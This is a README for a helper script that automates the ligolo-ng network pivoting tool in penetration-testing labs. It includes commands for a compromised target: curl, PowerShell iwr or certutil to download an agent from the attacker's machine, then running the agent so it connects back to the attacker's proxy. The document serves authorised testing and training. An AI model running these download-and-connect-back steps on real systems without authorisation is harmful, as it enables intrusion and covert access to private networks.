# Ligolo-ng Helper

A single-command setup script for [ligolo-ng](https://github.com/nicocha30/ligolo-ng) that automates the entire process and guides you through each step.

## What is this?

Ligolo-ng creates a VPN-like tunnel to a target network during penetration tests. Once set up, you can access the target network directly (nmap, ssh, curl, etc.) without proxychains.

This helper script eliminates the manual setup by:
- Downloading the correct binaries
- Creating the TUN interface
- Starting a file server for agent transfer
- Providing copy-paste commands with your IP pre-filled
- Showing exactly what to expect at each step

## Quick Start

```bash
# Download the script
curl -O https://raw.githubusercontent.com/YOUR_USERNAME/ligolo-helper/main/ligolo-helper.sh
chmod +x ligolo-helper.sh

# Run as root - that's it!
sudo ./ligolo-helper.sh auto
```

Then follow the on-screen instructions.

## What `auto` Does

1. Downloads ligolo-ng proxy and agent binaries (Linux/Windows/macOS)
2. Creates and activates the TUN interface
3. Starts a file server on port 8000 for easy agent transfer
4. Displays step-by-step instructions with your actual IP address
5. Starts the proxy server

## Example Output

```
╔═══════════════════════════════════════════════════════════════════════╗
║                        FOLLOW THESE STEPS                             ║
╚═══════════════════════════════════════════════════════════════════════╝

STEP 1: Download agent on target machine

  TARGET IS LINUX:
    curl http://10.10.14.5:8000/ligolo-agent -o /tmp/a && chmod +x /tmp/a

  TARGET IS WINDOWS (PowerShell):
    iwr http://10.10.14.5:8000/ligolo-agent.exe -o a.exe

STEP 2: Run agent on target

  LINUX:
    /tmp/a -connect 10.10.14.5:11601 -ignore-cert

  WINDOWS:
    .\a.exe -connect 10.10.14.5:11601 -ignore-cert

...
```

## All Commands

| Command | Description |
|---------|-------------|
| `auto` | Full automatic setup - download, configure, and start |
| `download` | Download ligolo-ng binaries only |
| `setup-tun` | Create TUN interface only |
| `teardown-tun` | Remove TUN interface |
| `proxy [opts]` | Start proxy with custom options |
| `add-route <cidr>` | Add route to target network (e.g., `10.10.10.0/24`) |
| `del-route <cidr>` | Remove a route |
| `agent-cmd [ip]` | Show agent commands for target |
| `status` | Show current ligolo setup status |

## Configuration

Environment variables (optional):

| Variable | Default | Description |
|----------|---------|-------------|
| `LIGOLO_DIR` | `~/.ligolo-ng` | Where to store binaries |
| `TUN_NAME` | `ligolo` | TUN interface name |
| `PROXY_PORT` | `11601` | Proxy listen port |

Example:
```bash
PROXY_PORT=443 ./ligolo-helper.sh auto
```

## IP Detection

The script automatically detects your IP in this order:
1. `tun0` (HackTheBox, TryHackMe, most VPNs)
2. `tun1` (secondary tunnel)
3. `tap0` (alternative tunnel type)
4. Default route (fallback)

## Requirements

- Linux (tested on Kali, Ubuntu, Debian)
- Root privileges (for TUN interface)
- `curl`, `jq`, `tar` (for downloading binaries)
- `python3` (optional, for file server)

On Kali/Debian/Ubuntu:
```bash
sudo apt install curl jq tar
```

## Troubleshooting

### Agent won't connect
Make sure the proxy port is open:
```bash
iptables -I INPUT -p tcp --dport 11601 -j ACCEPT
```

### Can't download on Windows target
Try certutil instead:
```cmd
certutil -urlcache -split -f http://YOUR_IP:8000/ligolo-agent.exe a.exe
```

### Route already exists
Remove it first:
```bash
./ligolo-helper.sh del-route 10.10.10.0/24
```

### TUN interface issues
Reset the interface:
```bash
./ligolo-helper.sh teardown-tun
./ligolo-helper.sh setup-tun
```

## Credits

- [ligolo-ng](https://github.com/nicocha30/ligolo-ng) by Nicolas Chatelain
- [Official Documentation](https://docs.ligolo.ng/)

## License

MIT License - See [LICENSE](LICENSE)
